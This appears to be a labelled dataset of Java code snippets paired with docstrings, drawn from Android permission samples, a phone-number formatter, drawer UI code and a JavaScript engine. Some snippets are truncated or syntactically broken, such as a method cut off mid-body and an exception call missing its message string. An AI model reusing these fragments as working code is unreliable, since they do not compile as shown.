1	public class CameraPreview extends SurfaceView implements SurfaceHolder.Callback { private static final String TAG = "CameraPreview"; private SurfaceHolder mHolder; private Camera mCamera; private Camera.CameraInfo mCameraInfo; private int mDisplayOrientation; public CameraPreview(Context context, Camera camera, Camera.CameraInfo cameraInfo, int displayOrientation) { super(context); if (camera == null || cameraInfo == null) { return; } setCamera(camera, cameraInfo, displayOrientation); mHolder = getHolder(); mHolder.addCallback(this); } public void surfaceCreated(SurfaceHolder holder) { try { mCamera.setPreviewDisplay(holder); mCamera.startPreview(); Log.d(TAG, "Camera preview started."); } catch (IOException e) { Log.d(TAG, "Error setting camera preview: " + e.getMessage()); } } public void surfaceDestroyed(SurfaceHolder holder) { } public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) { if (mHolder.getSurface() == null) { Log.d(TAG, "Preview surface does not exist"); return; } try { mCamera.stopPreview(); Log.d(TAG, "Preview stopped."); } catch (Exception e) { Log.d(TAG, "Error starting camera preview: " + e.getMessage()); } int orientation = calculatePreviewOrientation(mCameraInfo, mDisplayOrientation); mCamera.setDisplayOrientation(orientation); try { mCamera.setPreviewDisplay(mHolder); mCamera.startPreview(); Log.d(TAG, "Camera preview started."); } catch (Exception e) { Log.d(TAG, "Error starting camera preview: " + e.getMessage()); } } public static int calculatePreviewOrientation(Camera.CameraInfo info, int rotation) { int degrees = 0; switch (rotation) { case Surface.ROTATION_0: degrees = 0; break; case Surface.ROTATION_90: degrees = 90; break; case Surface.ROTATION_180: degrees = 180; break; case Surface.ROTATION_270: degrees = 270; break; } int result; if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) { result = (info.orientation + degrees) % 360; result = (360 - result) % 360; } else { result = (info.orientation - degrees + 360) % 360; } return result; } public void setCamera(Camera camera, Camera.CameraInfo cameraInfo, int displayOrientation) { if (camera == null || cameraInfo == null) { return; } mCamera = camera; mCameraInfo = cameraInfo; mDisplayOrientation = displayOrientation; } }	Handles basic lifecycle methods to display and stop the preview.
1	private static final int CAMERA_ID = 0;	Id of the camera to access. 0 is the first camera.
1	public static Camera getCameraInstance(int cameraId) { Camera c = null; try { c = Camera.open(cameraId);  } catch (Exception e) { Log.d(TAG, "Camera " + cameraId + " is not available: " + e.getMessage()); } return c; }	A safe way to get an instance of the Camera object.
1	public class CameraPreviewFragment extends Fragment { private static final String TAG = "CameraPreview"; private static final int CAMERA_ID = 0; private CameraPreview preview; private Camera camera; public static CameraPreviewFragment newInstance() { return new CameraPreviewFragment(); } public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) { return inflater.inflate(R.layout.fragment_camera, null); } public void onViewCreated(View view, @Nullable Bundle savedInstanceState) { super.onViewCreated(view, savedInstanceState); Button backButton = view.findViewById(R.id.back); backButton.setOnClickListener(new View.OnClickListener() { public void onClick(View view) { onBackClick(); } }); initCamera(); } private void initCamera() { camera = getCameraInstance(CAMERA_ID); Camera.CameraInfo cameraInfo = null; if (camera != null) { cameraInfo = new Camera.CameraInfo(); Camera.getCameraInfo(CAMERA_ID, cameraInfo); } final int displayRotation = getActivity().getWindowManager().getDefaultDisplay() .getRotation(); if (getView() == null) { return; } FrameLayout preview = getView().findViewById(R.id.camera_preview); preview.removeAllViews(); if (this.preview == null) { this.preview = new CameraPreview(getActivity(), camera, cameraInfo, displayRotation); } else { this.preview.setCamera(camera, cameraInfo, displayRotation); } preview.addView(this.preview); } private void onBackClick() { getFragmentManager().popBackStack(); } public void onResume() { super.onResume(); if (camera == null) { initCamera(); } } public void onPause() { super.onPause(); releaseCamera(); } public static Camera getCameraInstance(int cameraId) { Camera c = null; try { c = Camera.open(cameraId); } catch (Exception e) { Log.d(TAG, "Camera " + cameraId + " is not available: " + e.getMessage()); } return c; } private void releaseCamera() { if (camera != null) { camera.release(); camera = null; } } }	This Fragment is only used to illustrate that access to the Camera API has been granted (or denied) as part of the runtime permissions model. It is not relevant for the use of the permissions API.
1	private static final String[] PROJECTION = {ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME_PRIMARY};	Projection for the content provider query includes the id and primary name of a contact.
1	private static final String ORDER = ContactsContract.Contacts.DISPLAY_NAME_PRIMARY + " ASC";	Sort order for the query. Sorted by primary name in ascending order.
2	public static ContactsFragment newInstance() { return new ContactsFragment(); }	
2	public Loader?onCreateLoader(int i, Bundle bundle) { return new CursorLoader(getActivity(), ContactsContract.Contacts.CONTENT_URI, PROJECTION, null, null, ORDER); }	
1	public void onLoadFinished(Loader?loader, Cursor cursor) { if (cursor != null) { final int totalCount = cursor.getCount(); if (totalCount > 0) { cursor.moveToFirst(); String name = cursor .getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)); messageText.setText( getResources().getString(R.string.contacts_string, totalCount, name)); Log.d(TAG, "First contact loaded: " + name); Log.d(TAG, "Total number of contacts: " + totalCount); Log.d(TAG, "Total number of contacts: " + totalCount); } else { Log.d(TAG, "List of contacts is empty."); messageText.setText(R.string.contacts_empty); } } }	Dislays either the name of the first contact or a message.
1	private void loadContact() { getLoaderManager().restartLoader(0, null, this); }	Restart the Loader to query the Contacts content provider to display the first contact.
1	private void insertDummyContact() { ArrayList?operations = new ArrayList<>(2); ContentProviderOperation.Builder op = ContentProviderOperation.newInsert(ContactsContract.RawContacts.CONTENT_URI) .withValue(ContactsContract.RawContacts.ACCOUNT_TYPE, null) .withValue(ContactsContract.RawContacts.ACCOUNT_NAME, null); operations.add(op.build()); String DUMMY_CONTACT_NAME = "__DUMMY CONTACT from runtime permissions sample"; op = ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI) .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0) .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE) .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, DUMMY_CONTACT_NAME); operations.add(op.build()); ContentResolver resolver = getActivity().getContentResolver(); try { resolver.applyBatch(ContactsContract.AUTHORITY, operations); } catch (RemoteException e) { Log.d(TAG, "Could not add a new contact: " + e.getMessage()); } catch (OperationApplicationException e) { Log.d(TAG, "Could not add a new contact: " + e.getMessage()); } }	Accesses the Contacts content provider directly to insert a new contact. The contact is called "__DUMMY ENTRY" and only contains a name.
1	public class ContactsFragment extends Fragment implements LoaderManager.LoaderCallbacks?{ private static final String TAG = "Contacts"; private TextView messageText = null; private static final String[] PROJECTION = {ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME_PRIMARY}; private static final String ORDER = ContactsContract.Contacts.DISPLAY_NAME_PRIMARY + " ASC"; public static ContactsFragment newInstance() { return new ContactsFragment(); } public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) { View rootView = inflater.inflate(R.layout.fragment_contacts, container, false); messageText = rootView.findViewById(R.id.contact_message); Button backButton = rootView.findViewById(R.id.back); backButton.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View view) { onBackClick(); } }); Button button = rootView.findViewById(R.id.contact_add); button.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View view) { insertDummyContact(); } }); button = rootView.findViewById(R.id.contact_load); button.setOnClickListener(new View.OnClickListener() { public void onClick(View view) { loadContact(); } }); return rootView; } private void onBackClick() { getFragmentManager().popBackStack(); } private void loadContact() { getLoaderManager().restartLoader(0, null, this); } public Loader?onCreateLoader(int i, Bundle bundle) { return new CursorLoader(getActivity(), ContactsContract.Contacts.CONTENT_URI, PROJECTION, null, null, ORDER); } public void onLoadFinished(Loader?loader, Cursor cursor) { if (cursor != null) { final int totalCount = cursor.getCount(); if (totalCount > 0) { cursor.moveToFirst(); String name = cursor .getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)); messageText.setText( getResources().getString(R.string.contacts_string, totalCount, name)); Log.d(TAG, "First contact loaded: " + name); Log.d(TAG, "Total number of contacts: " + totalCount); Log.d(TAG, "Total number of contacts: " + totalCount); } else { Log.d(TAG, "List of contacts is empty."); messageText.setText(R.string.contacts_empty); } } } public void onLoaderReset(Loader?loader) { messageText.setText(R.string.contacts_empty); } private void insertDummyContact() { ArrayList?operations = new ArrayList<>(2); ContentProviderOperation.Builder op = ContentProviderOperation.newInsert(ContactsContract.RawContacts.CONTENT_URI) .withValue(ContactsContract.RawContacts.ACCOUNT_TYPE, null) .withValue(ContactsContract.RawContacts.ACCOUNT_NAME, null); operations.add(op.build()); String DUMMY_CONTACT_NAME = "__DUMMY CONTACT from runtime permissions sample"; op = ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI) .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0) .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE) .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, DUMMY_CONTACT_NAME); operations.add(op.build()); ContentResolver resolver = getActivity().getContentResolver(); try { resolver.applyBatch(ContactsContract.AUTHORITY, operations); } catch (RemoteException e) { Log.d(TAG, "Could not add a new contact: " + e.getMessage()); } catch (OperationApplicationException e) { Log.d(TAG, "Could not add a new contact: " + e.getMessage()); } } }	Displays the first contact stored on the device and contains an option to add a dummy contact. This Fragment is only used to illustrate that access to the Contacts ContentProvider API has been granted (or denied) as part of the runtime permissions model. It is not relevant for the use of the permissions API.
1	public @interface NeedsPermission { String[] value(); int maxSdkVersion() default 0; }	Register some methods which permissions are needed.
1	public @interface OnNeverAskAgain { String[] value(); }	Register some methods handling the user's choice to permanently deny permissions.
1	public @interface OnPermissionDenied { String[] value(); }	Register some methods which permissions are needed.
1	public @interface OnShowRationale { String[] value(); }	Register some methods which explain why permissions are needed.
2	public interface PermissionRequest { void proceed(); void cancel(); }	
1	public static boolean verifyPermissions(int... grantResults) { if (grantResults.length == 0) { return false; } for (int result : grantResults) { if (result != PackageManager.PERMISSION_GRANTED) { return false; } } return true; }	Checks all given permissions have been granted.
1	public static boolean hasSelfPermissions(Context context, String... permissions) { for (String permission : permissions) { if (permissionExists(permission) && !hasSelfPermission(context, permission)) { return false; } } return true; }	Returns true if the Activity or Fragment has access to all given permissions.
1	public static boolean shouldShowRequestPermissionRationale(Activity activity, String... permissions) { for (String permission : permissions) { if (ActivityCompat.shouldShowRequestPermissionRationale(activity, permission)) { return true; } } return false; }	Checks given permissions are needed to show rationale.
1	private static boolean permissionExists(String permission) { Integer minVersion = MIN_SDK_PERMISSIONS.get(permission); return minVersion == null || Build.VERSION.SDK_INT >= minVersion; }	Returns true if the permission exists in this SDK version
1	void closeFile(Closeable closeable) { if (closeable == null) { return; } try { closeable.close(); } catch (IOException e) { logger.log(Level.WARNING, e.getMessage()); } }	Closes the provided file and logs any potential IOException.
2	public abstract class AbstractPhonePrefixDataIOHandler { private static final Logger logger = Logger.getLogger( AbstractPhonePrefixDataIOHandler.class.getName()); abstract void addFileToOutput(File file) throws IOException; abstract File createFile(String path); abstract void close(); void closeFile(Closeable closeable) { if (closeable == null) { return; } try { closeable.close(); } catch (IOException e) { logger.log(Level.WARNING, e.getMessage()); } } }	
2	AsYouTypeFormatter(String regionCode) { defaultCountry = regionCode; currentMetadata = getMetadataForRegion(defaultCountry); defaultMetadata = currentMetadata; }	
1	String attemptToFormatAccruedDigits() { for (NumberFormat numberFormat : possibleFormats) { Matcher m = regexCache.getPatternForRegex(numberFormat.getPattern()).matcher(nationalNumber); if (m.matches()) { shouldAddSpaceAfterNationalPrefix = NATIONAL_PREFIX_SEPARATORS_PATTERN.matcher( numberFormat.getNationalPrefixFormattingRule()).find(); String formattedNumber = m.replaceAll(numberFormat.getFormat()); return appendNationalNumber(formattedNumber); } } return ""; }	Checks to see if there is an exact pattern match for these digits. If so, we should use this instead of any other formatting template whose leadingDigitsPattern also matches the input.
1	private String appendNationalNumber(String nationalNumber) { int prefixBeforeNationalNumberLength = prefixBeforeNationalNumber.length(); if (shouldAddSpaceAfterNationalPrefix && prefixBeforeNationalNumberLength > 0 && prefixBeforeNationalNumber.charAt(prefixBeforeNationalNumberLength - 1) != SEPARATOR_BEFORE_NATIONAL_NUMBER) { return new String(prefixBeforeNationalNumber) + SEPARATOR_BEFORE_NATIONAL_NUMBER + nationalNumber; } else { return prefixBeforeNationalNumber + nationalNumber; } }	Combines the national number with any prefix (IDD/+ and country code or national prefix) that was collected. A space will be inserted between them if the current formatting template indicates this to be suitable.
1	private String attemptToChooseFormattingPattern() { if (nationalNumber.length() >= MIN_LEADING_DIGITS_LENGTH) { getAvailableFormats(nationalNumber.toString()); String formattedNumber = attemptToFormatAccruedDigits(); if (formattedNumber.length() > 0) { return formattedNumber; } return maybeCreateNewTemplate() ? inputAccruedNationalNumber() : accruedInput.toString(); } else { return appendNationalNumber(nationalNumber.toString()); } }	Attempts to set the formatting template and returns a string which contains the formatted version of the digits entered so far.
1	private String inputAccruedNationalNumber() { int lengthOfNationalNumber = nationalNumber.length(); if (lengthOfNationalNumber > 0) { String tempNationalNumber = ""; for (int i = 0; i < lengthOfNationalNumber; i++) { tempNationalNumber = inputDigitHelper(nationalNumber.charAt(i)); } return ableToFormat ? appendNationalNumber(tempNationalNumber) : accruedInput.toString(); } else { return prefixBeforeNationalNumber.toString(); } }	Invokes inputDigitHelper on each digit of the national number accrued, and returns a formatted string in the end.
1	private boolean isNanpaNumberWithNationalPrefix() { return (currentMetadata.getCountryCode() == 1) && (nationalNumber.charAt(0) == '1') && (nationalNumber.charAt(1) != '0') && (nationalNumber.charAt(1) != '1'); }	Returns true if the current country is a NANPA country and the national number begins with the national prefix.
1	private boolean attemptToExtractIdd() { Pattern internationalPrefix = regexCache.getPatternForRegex("\\" + PhoneNumberUtil.PLUS_SIGN + "|" + currentMetadata.getInternationalPrefix()); Matcher iddMatcher = internationalPrefix.matcher(accruedInputWithoutFormatting); if (iddMatcher.lookingAt()) { isCompleteNumber = true; int startOfCountryCallingCode = iddMatcher.end(); nationalNumber.setLength(0); nationalNumber.append(accruedInputWithoutFormatting.substring(startOfCountryCallingCode)); prefixBeforeNationalNumber.setLength(0); prefixBeforeNationalNumber.append( accruedInputWithoutFormatting.substring(0, startOfCountryCallingCode)); if (accruedInputWithoutFormatting.charAt(0) != PhoneNumberUtil.PLUS_SIGN) { prefixBeforeNationalNumber.append(SEPARATOR_BEFORE_NATIONAL_NUMBER); } return true; } return false; }	Extracts IDD and plus sign to prefixBeforeNationalNumber when they are available, and places the remaining input into nationalNumber.
1	private boolean attemptToExtractCountryCallingCode() { if (nationalNumber.length() == 0) { return false; } StringBuilder numberWithoutCountryCallingCode = new StringBuilder(); int countryCode = phoneUtil.extractCountryCode(nationalNumber, numberWithoutCountryCallingCode); if (countryCode == 0) { return false; } nationalNumber.setLength(0); nationalNumber.append(numberWithoutCountryCallingCode); String newRegionCode = phoneUtil.getRegionCodeForCountryCode(countryCode); if (PhoneNumberUtil.REGION_CODE_FOR_NON_GEO_ENTITY.equals(newRegionCode)) { currentMetadata = phoneUtil.getMetadataForNonGeographicalRegion(countryCode); } else if (!newRegionCode.equals(defaultCountry)) { currentMetadata = getMetadataForRegion(newRegionCode); } String countryCodeString = Integer.toString(countryCode); prefixBeforeNationalNumber.append(countryCodeString).append(SEPARATOR_BEFORE_NATIONAL_NUMBER); extractedNationalPrefix = ""; return true; }	Extracts the country calling code from the beginning of nationalNumber to prefixBeforeNationalNumber when they are available, and places the remaining input into nationalNumber.
1	public void clear() { currentOutput = ""; accruedInput.setLength(0); accruedInputWithoutFormatting.setLength(0); formattingTemplate.setLength(0); lastMatchPosition = 0; currentFormattingPattern = ""; prefixBeforeNationalNumber.setLength(0); extractedNationalPrefix = ""; nationalNumber.setLength(0); ableToFormat = true; inputHasFormatting = false; positionToRemember = 0; originalPosition = 0; isCompleteNumber = false; isExpectingCountryCallingCode = false; possibleFormats.clear(); shouldAddSpaceAfterNationalPrefix = false; if (!currentMetadata.equals(defaultMetadata)) { currentMetadata = getMetadataForRegion(defaultCountry); } }	Clears the internal state of the formatter, so it can be reused.
1	public String inputDigit(char nextChar) { currentOutput = inputDigitWithOptionToRememberPosition(nextChar, false); return currentOutput; }	Formats a phone number on-the-fly as each digit is entered.
2	public String inputDigitAndRememberPosition(char nextChar) { currentOutput = inputDigitWithOptionToRememberPosition(nextChar, true); return currentOutput; }	
2	public int getRememberedPosition() { if (!ableToFormat) { return originalPosition; } int accruedInputIndex = 0; int currentOutputIndex = 0; while (accruedInputIndex < positionToRemember && currentOutputIndex < currentOutput.length()) { if (accruedInputWithoutFormatting.charAt(accruedInputIndex) == currentOutput.charAt(currentOutputIndex)) { accruedInputIndex++; } currentOutputIndex++; } return currentOutputIndex; }	
2	public final int getChildType(int groupPosition, int childPosition) { GroupInfo info = getGroupInfo(groupPosition); if (info.animating) { return 0; } else { return getRealChildType(groupPosition, childPosition) + 1; } }	
2	public final int getChildTypeCount() { return getRealChildTypeCount() + 1; }	
1	private static final int ANIMATION_DURATION = 150;	The duration of the expand/collapse animations
1	public boolean expandGroupWithAnimation(int groupPos) { boolean lastGroup = groupPos == adapter.getGroupCount() - 1; if (lastGroup && Build.VERSION.SDK_INT >= Build.VERSION_CODES.ICE_CREAM_SANDWICH) { return expandGroup(groupPos, true); } int groupFlatPos = getFlatListPosition(getPackedPositionForGroup(groupPos)); if (groupFlatPos != -1) { int childIndex = groupFlatPos - getFirstVisiblePosition(); if (childIndex < getChildCount()) { View v = getChildAt(childIndex); if (v.getBottom() >= getBottom()) { adapter.startExpandAnimation(groupPos, 0); return expandGroup(groupPos); }	Expands the given group with an animation.
1	public boolean collapseGroupWithAnimation(int groupPos) { int groupFlatPos = getFlatListPosition(getPackedPositionForGroup(groupPos)); if (groupFlatPos != -1) { int childIndex = groupFlatPos - getFirstVisiblePosition(); if (childIndex >= 0 && childIndex < getChildCount()) { View v = getChildAt(childIndex); if (v.getBottom() >= getBottom()) { return collapseGroup(groupPos); } } else { return collapseGroup(groupPos); } } long packedPos = getExpandableListPosition(getFirstVisiblePosition()); int firstChildPos = getPackedPositionChild(packedPos); int firstGroupPos = getPackedPositionGroup(packedPos); firstChildPos = firstChildPos == -1 || firstGroupPos != groupPos ? 0 : firstChildPos; adapter.startCollapseAnimation(groupPos, firstChildPos); adapter.notifyDataSetChanged(); return isGroupExpanded(groupPos); }	Collapses the given group with an animation.
1	public class SequenceFileExportWriter { SequenceFile.Writer writer; TypedBytesWritable key; TypedBytesWritable value; public SequenceFileExportWriter(Configuration conf, Path path) throws Exception { FileSystem fs = FileSystem.get(conf); key = new TypedBytesWritable(); value = new TypedBytesWritable(); writer = SequenceFile.createWriter(fs, conf, path, TypedBytesWritable.class, TypedBytesWritable.class); } public void write(Expr[][] list) throws Exception { for (int i = 0; i < list.length; i++) { if (list[i].length != 2) { throw new IllegalArgumentException("Malformed record"); } key.setValue(ExprUtil.fromExpr(list[i][0])); value.setValue(ExprUtil.fromExpr(list[i][1])); writer.append(key, value); } } public void close() throws Exception { writer.close(); } }	Helper class to speed up export of Mathematica expressions to sequence files.
1	private static final boolean DEBUG = false;	Indicates whether debug code should be enabled.
1	private static final int DEFAULT_DRAG_BEZEL_DP = 32;	The default touch bezel size of the drawer in dp.
1	private static final int CLOSE_ENOUGH = 3;	Distance in dp from closed position from where the drawer is considered closed with regards to touch events.
1	private static final int DEFAULT_ANIMATION_DURATION = 600;	The maximum animation duration.
1	private static final String STATE_MENU_VISIBLE = "ElasticDrawer.menuVisible";	Key used when saving menu visibility state.
1	protected static final int ANIMATION_DELAY = 1000 / 60;	The time between each frame when animating the drawer.
1	protected static final Interpolator SMOOTH_INTERPOLATOR = new SmoothInterpolator();	Interpolator used when animating the drawer open/closed.
1	protected boolean mMenuVisible;	Indicates whether the menu is currently visible.
1	protected int mMenuSize;	The size of the menu (width or height depending on the gravity).
1	protected float mLastMotionY = -1;	The last Y position of a drag.
1	protected VelocityTracker mVelocityTracker;	Velocity tracker used when animating the drawer open/closed after a drag.
1	protected int mCloseEnough;	Distance in px from closed position from where the drawer is considered closed with regards to touch events.
1	protected int mTouchSize;	The touch area size of the drawer in px.
1	protected BuildLayerFrameLayout mMenuContainer;	The parent of the menu view.
1	protected BuildLayerFrameLayout mContentContainer;	The parent of the content view.
1	protected int mMenuBackground;	The color of the menu.
1	protected OnInterceptMoveEventListener mOnInterceptMoveEventListener;	Callback that lets the listener override intercepting of touch events.
1	protected int mMaxAnimationDuration = DEFAULT_ANIMATION_DURATION;	The maximum duration of open/close animations.
1	protected boolean mIsDragging;	Indicates whether the drawer is currently being dragged.
1	protected Bundle mState;	Bundle used to hold the drawers state.
1	private Scroller mScroller;	Scroller used when animating the drawer open/closed.
1	private int mPosition;	The position of the drawer.
1	private FlowingMenuLayout mMenuView;	The custom menu view set by the user.
1	private OnDrawerStateChangeListener mOnDrawerStateChangeListener;	Listener used to dispatch state change events.
1	private final Runnable mDragRunnable = new Runnable() {	Runnable used when animating the drawer open/closed.
1	public static final int TOUCH_MODE_NONE = 0;	Disallow opening the drawer by dragging the screen.
1	public boolean isMenuVisible() { return mMenuVisible; }	Indicates whether the menu is currently visible.
1	public void setMenuSize(final int size) { mMenuSize = size; if (mDrawerState == STATE_OPEN || mDrawerState == STATE_OPENING) { setOffsetPixels(mMenuSize, 0, FlowingMenuLayout.TYPE_NONE); } requestLayout(); invalidate(); }	Set the size of the menu drawer when open.
1	public void setOnDrawerStateChangeListener(OnDrawerStateChangeListener listener) { mOnDrawerStateChangeListener = listener; }	Register a callback to be invoked when the drawer state changes.
1	public void setOnInterceptMoveEventListener(OnInterceptMoveEventListener listener) { mOnInterceptMoveEventListener = listener; }	Register a callback that will be invoked when the drawer is about to intercept touch events.
1	public void setMaxAnimationDuration(int duration) { mMaxAnimationDuration = duration; }	Sets the maximum duration of open/close animations.
1	public ViewGroup getContentContainer() { return mContentContainer; }	Returns the ViewGroup used as a parent for the content view.
1	public int getDrawerState() { return mDrawerState; }	Get the current state of the drawer.
1	public void restoreState(Parcelable in) { mState = (Bundle) in; final boolean menuOpen = mState.getBoolean(STATE_MENU_VISIBLE); if (menuOpen) { openMenu(false); } else { setOffsetPixels(0, 0, FlowingMenuLayout.TYPE_NONE); } mDrawerState = menuOpen ? STATE_OPEN : STATE_CLOSED; }	Restores the state of the drawer.
1	protected void animateOffsetTo(int position, int velocity, boolean animate, float eventY) { endDrag(); final int startX = (int) mOffsetPixels; final int dx = position - startX; if (dx == 0 || !animate) { setOffsetPixels(position, 0, FlowingMenuLayout.TYPE_NONE); setDrawerState(position == 0 ? STATE_CLOSED : STATE_OPEN); stopLayerTranslation(); return; } int duration; velocity = Math.abs(velocity); if (velocity > 0) { duration = 4 * Math.round(1000.f * Math.abs((float) dx / velocity)); } else { duration = (int) (600.f * Math.abs((float) dx / mMenuSize)); } duration = Math.min(duration, mMaxAnimationDuration); animateOffsetTo(position, duration, eventY); }	Moves the drawer to the position passed.
1	protected void setOffsetPixels(float offsetPixels, float eventY, int type) { final int oldOffset = (int) mOffsetPixels; final int newOffset = (int) offsetPixels; mOffsetPixels = offsetPixels; mMenuView.setClipOffsetPixels(mOffsetPixels, eventY, type); if (newOffset != oldOffset) { onOffsetPixelsChanged(newOffset); mMenuVisible = newOffset != 0; final float openRatio = ((float) Math.abs(newOffset)) / mMenuSize; dispatchOnDrawerSlide(openRatio, newOffset); } }	Sets the number of pixels the content should be offset.
1	protected boolean canChildScrollHorizontally(View v, boolean checkV, int dx, int x, int y) { if (v instanceof ViewGroup) { final ViewGroup group = (ViewGroup) v; final int count = group.getChildCount(); for (int i = count - 1; i >= 0; i--) { final View child = group.getChildAt(i); final int childLeft = child.getLeft() + supportGetTranslationX(child); final int childRight = child.getRight() + supportGetTranslationX(child); final int childTop = child.getTop() + supportGetTranslationY(child); final int childBottom = child.getBottom() + supportGetTranslationY(child); if (x >= childLeft && x < childRight && y >= childTop && y < childBottom && canChildScrollHorizontally(child, true, dx, x - childLeft, y - childTop)) { return true; } } } return checkV && mOnInterceptMoveEventListener.isViewDraggable(v, dx, x, y); }	Tests scrollability within child views of v given a delta of dx.
1	protected void endDrag() { mIsDragging = false; if (mVelocityTracker != null) { mVelocityTracker.recycle(); mVelocityTracker = null; } }	Called when a drag has been ended.
1	protected void stopAnimation() { removeCallbacks(mDragRunnable); mScroller.abortAnimation(); stopLayerTranslation(); }	Stops ongoing animation of the drawer.
1	private void postAnimationInvalidate() { if (mScroller.computeScrollOffset()) { final int oldX = (int) mOffsetPixels; final int x = mScroller.getCurrX(); if (x != oldX) { if (mDrawerState == STATE_OPENING) { setOffsetPixels(x, eventY, FlowingMenuLayout.TYPE_UP_AUTO); } else if (mDrawerState == STATE_CLOSING) { setOffsetPixels(x, eventY, FlowingMenuLayout.TYPE_DOWN_AUTO); } } if (x != mScroller.getFinalX()) { postOnAnimation(mDragRunnable); return; } } if (mDrawerState == STATE_OPENING) { completeAnimation(); } else if (mDrawerState == STATE_CLOSING) { mScroller.abortAnimation(); final int finalX = mScroller.getFinalX(); mMenuVisible = finalX != 0; setOffsetPixels(finalX, 0, FlowingMenuLayout.TYPE_NONE); setDrawerState(finalX == 0 ? STATE_CLOSED : STATE_OPEN); stopLayerTranslation(); } }	Callback when each frame in the drawer animation should be drawn.
2	public abstract class BaseLayout extends FrameLayout { protected MenuItem mMenuItem; protected BaseLayout(Context context, MenuItem menuItem) { super(context); mMenuItem = menuItem; } protected abstract void build(); public abstract TextView getTextView(); public abstract ImageView getImageView(); }	Created by yuyidong on 2016/11/18.
1	public void changeStartColor(@ColorInt int color) { stopAnimation(); setStartColor(color); reinitialize(); }	It will be restarted your view
1	public String getClassName() { return "AnnotatedHostObject"; }	Get the name of the set of objects implemented by this Java class. This corresponds to the [[Class]] operation in ECMA and is used by Object.prototype.toString() in ECMA. See ECMA 8.6.2 and 15.2.4.2.
1	public void visit(NodeVisitor v) { if (v.visit(this)) { iterator.visit(v); iteratedObject.visit(v); } }	Visits the iterator expression and the iterated object expression. There is no body-expression for this loop type.
1	public boolean isDestructuring() { return isDestructuring; }	Returns true if this node is in a destructuring position: a function parameter, the target of a variable initializer, the iterator of a for..in loop, etc.
1	public Object call(Context cx, Scriptable scope, Scriptable thisObj, Object[] args) { Scriptable callThis = boundThis != null ? boundThis : ScriptRuntime.getTopCallScope(cx); return targetFunction.call(cx, scope, callThis, args); }	Call the function. Note that the array of arguments is not guaranteed to have length greater than 0.
1	public Scriptable construct(Context cx, Scriptable scope, Object[] args) { throw ScriptRuntime.typeError1("msg.not.ctor", decompile(0, 0)); }	Call the function as a constructor.
1	public boolean hasInstance(Scriptable instance) { if (targetFunction instanceof Function) { return ((Function) targetFunction).hasInstance(instance); } throw ScriptRuntime.typeError0("msg.not.ctor"); }	The instanceof operator. The JavaScript code "lhs instanceof rhs" causes rhs.hasInstance(lhs) to be called. The return value is implementation dependent so that embedded host objects can return an appropriate value. See the JS 1.3 language documentation for more detail. This operator corresponds to the proposed EMCA [[HasInstance]] operator.
1	public String toSource() { return this.toSource(0); }	Prints the source indented to depth 0.
1	public String shortName() { String classname = getClass().getName(); int last = classname.lastIndexOf("."); return classname.substring(last + 1); }	Returns a short, descriptive name for the node, such as "ArrayComprehension".
1	public String debugPrint() { DebugPrintVisitor dpv = new DebugPrintVisitor(new StringBuilder(1000)); visitAll(dpv); return dpv.toString(); }	A debug-printer that includes comments (at the end).
1	public Scriptable construct(Context cx, Scriptable scope, Object[] args) { Scriptable result = createObject(cx, scope); if (result != null) { Object val = call(cx, scope, result, args); if (val instanceof Scriptable) { result = (Scriptable)val; } } else { Object val = call(cx, scope, null, args); if (!(val instanceof Scriptable)) { throw new IllegalStateException( +getFunctionName()+" in "+getClass().getName()); } result = (Scriptable)val; if (result.getPrototype() == null) { Scriptable proto = getClassPrototype(); if (result != proto) { result.setPrototype(proto); } } if (result.getParentScope() == null) { Scriptable parent = getParentScope(); if (result != parent) { result.setParentScope(parent); } } } return result; }	Call the function as a constructor.
1	String decompile(int indent, int flags) { StringBuilder sb = new StringBuilder(); boolean justbody = (0 != (flags & Decompiler.ONLY_BODY_FLAG)); if (!justbody) { sb.append("function "); sb.append(getFunctionName()); sb.append("() {\n\t"); } sb.append("[native code, arity="); sb.append(getArity()); sb.append("]\n"); if (!justbody) { sb.append("}\n"); } return sb.toString(); }	Decompile the source information associated with this js function/script back into a string.
1	private void inlineFinally(Node finallyTarget, int finallyStart, int finallyEnd) { Node fBlock = getFinallyAtTarget(finallyTarget); fBlock.resetTargets(); Node child = fBlock.getFirstChild(); exceptionManager.markInlineFinallyStart(fBlock, finallyStart); while (child != null) { generateStatement(child); child = child.getNext(); } exceptionManager.markInlineFinallyEnd(fBlock, finallyEnd); }	Inline a FINALLY node into the method bytecode. In addition, an end label that should be unmarked is given as a method parameter. It is the responsibility of any callers of this method to mark the label. The start and end labels of the finally block are used to exclude the inlined block from the proper exception handler. For example, an inlined finally block should not be handled by a catch-all-rethrow.
1	private Node getFinallyAtTarget(Node node) { if (node == null) { return null; } else if (node.getType() == Token.FINALLY) { return node; } else if (node != null && node.getType() == Token.TARGET) { Node fBlock = node.getNext(); if (fBlock != null && fBlock.getType() == Token.FINALLY) { return fBlock; } } throw Kit.codeBug("bad finally target"); }	Get a FINALLY node at a point in the IR. This is strongly dependent on the generated IR. If the node is a TARGET, it only check the next node to see if it is a FINALLY node.
